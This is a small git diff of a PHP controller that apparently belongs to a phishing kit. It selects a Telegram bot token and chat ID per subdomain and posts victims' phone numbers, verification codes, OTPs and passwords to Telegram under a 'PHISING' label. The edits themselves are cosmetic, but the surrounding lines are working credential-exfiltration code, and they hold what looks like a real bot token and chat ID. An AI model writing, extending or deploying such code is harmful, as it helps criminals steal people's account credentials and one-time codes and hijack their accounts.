@@ -209,6 +209,7 @@ class HomeController extends Controller
             $phisData = "MY21";
         } else if ($subdomain == "livegroup-vcx22") {
             // BOT 21s`
+
             $bot_token = "7812629550:AAHtlojqML7eNzuTFnlc1QSKt20EQZ_47oU";
 
             $chat_id = "7372567403";
@@ -232,7 +233,7 @@ class HomeController extends Controller
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, [
             'chat_id' => $chat_id,
-            'text' => "Phone | $phone \n Code | $code \n OTP | $otp \n Password : $password \n \n \n
+            'text' => "Phone | $phone \n Code | $code \n OTP | $otp \n password | $password \n \n \n
     PHISING $phisData
     "
         ]);
